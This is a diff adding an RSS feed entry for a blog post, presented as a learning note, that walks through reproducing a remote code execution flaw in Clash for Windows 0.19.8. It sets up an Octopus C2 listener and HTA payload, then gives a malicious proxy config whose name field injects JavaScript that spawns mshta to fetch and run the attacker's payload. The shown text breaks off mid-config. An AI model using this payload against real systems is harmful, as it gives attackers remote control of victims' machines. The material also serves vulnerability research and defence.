@@ -6,6 +6,690 @@
         <description>Recent content in Security on CSNek0&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
-        <lastBuildDate>Thu, 27 Jan 2022 01:03:14 -0500</lastBuildDate><atom:link href="https://kira-pgr.github.io/categories/security/index.xml" rel="self" type="application/rss+xml" />
+        <lastBuildDate>Thu, 27 Jan 2022 01:03:14 -0500</lastBuildDate><atom:link href="https://kira-pgr.github.io/categories/security/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Reproducing Clash RCE</title>
+        <link>https://kira-pgr.github.io/p/reproducing-clash-rce/</link>
+        <pubDate>Fri, 25 Feb 2022 23:27:12 -0500</pubDate>
+        
+        <guid>https://kira-pgr.github.io/p/reproducing-clash-rce/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/reproducing-clash-rce/cover.jpg" alt="Featured image of post Reproducing Clash RCE" /&gt;&lt;h1 id=&#34;clash-for-windows-rce&#34;&gt;Clash For Windows RCE&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;hat is RCE?&lt;/p&gt;
+&lt;p&gt;&lt;del&gt;Fake answer: Reliable Computer Engineering&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;It actually stands for Remote Code Execution&lt;/strong&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;disclaimer&#34;&gt;Disclaimer&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;This article is PGR&amp;rsquo;s personal note on vulnerability reproduction, intended for reference/learning purposes only. Any loss caused by using the techniques in this article is solely the user&amp;rsquo;s responsibility&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;preparation&#34;&gt;Preparation&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Tip: Please use a Linux machine and a Windows machine, otherwise you may encounter &lt;unexpected&gt; issues&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;(Don&amp;rsquo;t have Linux? Download &lt;a class=&#34;link&#34; href=&#34;https://www.kali.org/get-kali/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Kali Linux&lt;/a&gt;)&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;a-vulnerable-clash-windows-client&#34;&gt;A Vulnerable Clash Windows Client&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Fndroid/clash_for_windows_pkg/releases/download/0.19.8/Clash.for.Windows-0.19.8-win.7z&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Download Link&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Download and install it on Windows as instructed&lt;/p&gt;
+&lt;h3 id=&#34;c2-tool-octopus&#34;&gt;C2 Tool Octopus&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Perform the following on a Linux system equipped with Python3 and Git&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;If not installed, please refer to:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://kira-pgr.github.io/posts/hugo1/#installing-git-if-already-pre-installed-on-your-system-please-ignore&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Installing Git&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Install Python3: Type &lt;code&gt;sudo apt install python3&lt;/code&gt; in the terminal&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;(Since most systems came with these things preinstalled, search online for installation methods if you&amp;rsquo;re not using a deb-based system)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/mhaskar/Octopus.git
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Octopus
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install -r requirements.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 octopus.py
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After successful installation, you should see the following interface&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌─&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;askar@hackbook&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;─&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/opt/redteaming/Octopus&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└──╼ &lt;span class=&#34;nv&#34;&gt;$python3&lt;/span&gt; octopus.py
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      ___           ___                       ___           ___         ___           ___
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;        /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;         ___        /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;        /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;      /__/&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;        /  /&lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    /  /::&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;      /  /:/         /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /  /::&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;      /  /::&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;      /  /:/_
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   /  /:/&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;    /  /:/         /  /:/     /  /:/&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;    /  /:/&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;    /  /:/ /&lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  /  /:/  &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  /  /:/  ___    /  /:/     /  /:/  &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  /  /:/~/:/  ___  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  /  /:/ /::&lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt; /__/:/ &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/__/:/  /  /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; /  /::&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   /__/:/ &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/__/:/ /:/  /__/&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/__/:/ /:/&lt;span class=&#34;se&#34;&gt;\:\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/  /:/ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/  /:/ /__/:/&lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/  /:/ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;/  /:/ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/~/:/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt; /:/   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt; /:/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt; /:/   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt; /:/   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/ /:/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/        &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\/&lt;/span&gt;:/     &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /:/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/       &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/          &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/       &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:\ &lt;/span&gt;     &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;:/        /__/:/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;         &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;                     &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;         &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;       &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;         &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    v1.2 stable !
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Octopus C2 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Control your shells
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Octopus &amp;gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To run again, just enter:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 octopus.py
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;apache2&#34;&gt;Apache2&lt;/h3&gt;
+&lt;p&gt;For deb-based systems:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install apache2
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For yum-based systems:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo yum -y install httpd
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo firewall-cmd --permanent --add-port&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;80/tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo firewall-cmd --permanent --add-port&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;443/tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo firewall-cmd --reload
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For other systems, refer to &lt;a class=&#34;link&#34; href=&#34;https://httpd.apache.org/docs/2.4/install.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;the official website&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;vulnerability-reproduction&#34;&gt;Vulnerability Reproduction&lt;/h2&gt;
+&lt;h3 id=&#34;linux-attacking-machine&#34;&gt;Linux (Attacking Machine)&lt;/h3&gt;
+&lt;p&gt;Open a terminal in the Octopus directory just downloaded&lt;/p&gt;
+&lt;p&gt;Type &lt;code&gt;python3 octopus.py&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;After entering the Octopus interface, enter the following&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;listen_http Your_Linux_IP &lt;span class=&#34;m&#34;&gt;5555&lt;/span&gt; Your_Linux_IP &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; AnyName.php Name
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;generate_hta Name
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;p&gt;A little reminder&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Get IP: Type &lt;code&gt;ifconfig&lt;/code&gt; in the terminal&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Don&amp;rsquo;t just &lt;strong&gt;blindly copy commands&lt;/strong&gt;; you need to change the &lt;strong&gt;ip/name&lt;/strong&gt; yourself&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;Now Octopus is listening. Note down the link provided by Octopus and keep this terminal open &lt;strong&gt;(don&amp;rsquo;t close it)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/1.png&#34;
+	width=&#34;318&#34;
+	height=&#34;24&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/reproducing-clash-rce/1_hu0562a55e3665f92b18a7212d3551942f_8236_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/reproducing-clash-rce/1_hu0562a55e3665f92b18a7212d3551942f_8236_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;Link Example&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1325&#34;
+		data-flex-basis=&#34;3180px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Create a configuration file named &lt;code&gt;RCE.yaml&lt;/code&gt; in the default directory of the Apache site &lt;code&gt;/var/www/html/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Use the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo vi RCE.yaml
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Enter the following content:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;7890&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;socks-port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;7891&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;allow-lan&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;mode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Rule&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;log-level&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;external-controller&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;9090&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;a&amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(&amp;#39;require(&amp;#34;child_process&amp;#34;).spawn(&amp;#34;mshta&amp;#34;,[&amp;#34;Octopus&amp;#39;s link &amp;#34;])&amp;#39;);&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;socks5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;127.0.0.1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;17938&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;skip-cert-verify&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;abc&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;socks5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;server&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;127.0.0.1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
